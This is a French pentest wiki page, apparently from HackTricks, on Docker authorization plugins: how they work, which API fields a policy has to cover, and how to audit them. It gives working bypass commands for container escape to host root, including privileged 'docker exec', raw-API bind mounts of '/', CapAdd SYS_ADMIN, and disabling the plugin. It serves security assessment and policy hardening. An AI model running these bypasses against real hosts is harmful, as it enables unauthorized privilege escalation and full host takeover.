# Plugins d'autorisation Runtime

{{#include ../../../banners/hacktricks-training.md}}

## Vue d'ensemble

Les plugins d'autorisation Runtime constituent une couche de politique supplémentaire qui détermine si un appelant peut effectuer une action donnée du daemon. Docker en est l'exemple classique. Par défaut, toute personne capable de communiquer avec le daemon Docker en possède effectivement un contrôle étendu. Les plugins d'autorisation tentent de restreindre ce modèle en examinant l'identité de l'utilisateur authentifié et l'opération API demandée, puis en autorisant ou en refusant la requête selon la politique.

Ce sujet mérite sa propre page, car il modifie le modèle d'exploitation lorsqu'un attaquant a déjà accès à une API Docker ou à un utilisateur appartenant au groupe `docker`. Dans ces environnements, la question n'est plus seulement « puis-je atteindre le daemon ? », mais aussi « le daemon est-il protégé par une couche d'autorisation et, si oui, cette couche peut-elle être contournée via des endpoints non gérés, un parsing JSON faible ou des permissions de gestion des plugins ? »

## Fonctionnement

Lorsqu'une requête atteint le daemon Docker, le sous-système d'autorisation peut transmettre le contexte de la requête à un ou plusieurs plugins installés. Le plugin voit l'identité de l'utilisateur authentifié, les détails de la requête, certains headers et des parties du corps de la requête ou de la réponse lorsque le content type est approprié. Plusieurs plugins peuvent être enchaînés, et l'accès n'est accordé que si tous les plugins autorisent la requête.

Ce modèle semble robuste, mais sa sécurité dépend entièrement de la compréhension complète de l'API par l'auteur de la politique. Un plugin qui bloque `docker run --privileged` mais ignore `docker exec`, ne prend pas en compte des clés JSON alternatives telles que `Binds` au niveau supérieur, ou autorise l'administration des plugins peut créer une fausse impression de restriction tout en laissant ouvertes des voies directes d'escalade de privilèges.

## Cibles courantes des plugins

Les domaines importants à examiner lors de la revue de la politique sont :

- les endpoints de création de conteneurs
- les champs de `HostConfig` tels que `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` et les options de partage des namespaces
- le comportement de `docker exec`
- les endpoints de gestion des plugins
- tout endpoint pouvant indirectement déclencher des actions Runtime en dehors du modèle de politique prévu

Historiquement, des exemples tels que le plugin `authz` de Twistlock et des plugins pédagogiques simples tels que `authobot` ont facilité l'étude de ce modèle, car leurs fichiers de politique et leurs chemins de code montraient comment la correspondance entre endpoint et action était réellement implémentée. Pour les travaux d'assessment, la leçon importante est que l'auteur de la politique doit comprendre toute la surface de l'API, et pas seulement les commandes CLI les plus visibles.

## Abuse

Le premier objectif est de déterminer ce qui est réellement bloqué. Si le daemon refuse une action, l'erreur leak souvent le nom du plugin, ce qui aide à identifier le contrôle utilisé :
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Si vous avez besoin d’un profilage plus large des endpoints, des outils tels que `docker_auth_profiler` sont utiles, car ils automatisent la tâche autrement répétitive consistant à vérifier quelles routes d’API et quelles structures JSON sont réellement autorisées par le plugin.

Si l’environnement utilise un plugin personnalisé et que vous pouvez interagir avec l’API, énumérez les champs d’objet qui sont réellement filtrés :
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ces vérifications sont importantes, car de nombreux échecs d’autorisation sont spécifiques aux champs plutôt qu’aux concepts. Un plugin peut rejeter un pattern CLI sans bloquer complètement la structure API équivalente.

### Exemple complet : `docker exec` ajoute des privilèges après la création du conteneur

Une politique qui bloque la création de conteneurs privilégiés, mais autorise la création de conteneurs non confinés ainsi que `docker exec`, peut tout de même être contournée :
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Si le daemon accepte la deuxième étape, l’utilisateur a récupéré un processus interactif privilégié à l’intérieur d’un container que l’auteur de la policy croyait restreint.

### Exemple complet : Bind Mount via une API brute

Certaines policies défaillantes n’inspectent qu’une seule structure JSON. Si le bind mount du système de fichiers racine n’est pas bloqué de manière cohérente, le host peut toujours être monté :
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
La même idée peut également apparaître sous `HostConfig` :
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
L'impact est un bypass complet du système de fichiers de l'hôte. Le détail intéressant est que le bypass vient d'une couverture incomplète de la policy plutôt que d'un bug du kernel.

### Exemple complet : attribut de capability non vérifié

Si la policy oublie de filtrer un attribut lié à une capability, l'attaquant peut créer un container qui récupère une capability dangereuse :
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Une fois que `CAP_SYS_ADMIN` ou une capability d’une puissance similaire est présente, de nombreuses techniques de breakout décrites dans [capabilities.md](protections/capabilities.md) et [privileged-containers.md](privileged-containers.md) deviennent accessibles.

### Exemple complet : désactivation du plugin

Si les opérations de gestion des plugins sont autorisées, le bypass le plus propre peut consister à désactiver entièrement le contrôle :
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Il s’agit d’une défaillance de la policy au niveau du control plane. La couche d’autorisation existe, mais l’utilisateur qu’elle était censée restreindre conserve toujours la permission de la désactiver.

## Vérifications

Ces commandes visent à déterminer si une couche de policy existe et si elle semble complète ou superficielle.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Ce qui est intéressant ici :

- Les messages de refus qui incluent le nom d'un plugin confirment la présence d'une couche d'autorisation et révèlent souvent l'implémentation exacte.
- Une liste de plugins visible par l'attaquant peut suffire à déterminer si des opérations de désactivation ou de reconfiguration sont possibles.
- Une policy qui bloque uniquement les actions CLI évidentes, mais pas les requêtes API brutes, doit être considérée comme contournable jusqu'à preuve du contraire.

## Valeurs par défaut du runtime

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissement manuel courant |
| --- | --- | --- | --- |
| Docker Engine | Non activé par défaut | L'accès au daemon est effectivement tout ou rien, sauf si un plugin d'autorisation est configuré | policy de plugin incomplète, blacklists au lieu d'allowlists, autorisation de la gestion des plugins, angles morts au niveau des champs |
| Podman | Pas d'équivalent direct courant | Podman s'appuie généralement davantage sur les permissions Unix, l'exécution rootless et les décisions relatives à l'exposition de l'API que sur des plugins authz de style Docker | exposition étendue d'une API Podman rootful, permissions faibles sur le socket |
| containerd / CRI-O | Modèle de contrôle différent | Ces runtimes s'appuient généralement sur les permissions du socket, les limites de confiance des nodes et les contrôles de l'orchestrateur situés aux couches supérieures plutôt que sur les plugins authz de Docker | montage du socket dans les workloads, hypothèses faibles concernant la confiance locale au node |
| Kubernetes | Utilise l'authn/authz au niveau de l'API-server et du kubelet, et non les plugins authz de Docker | Le RBAC du cluster et les contrôles d'admission constituent la principale couche de policy | RBAC trop permissif, policy d'admission faible, exposition directe du kubelet ou des APIs du runtime |

{{#include ../../../banners/hacktricks-training.md}}
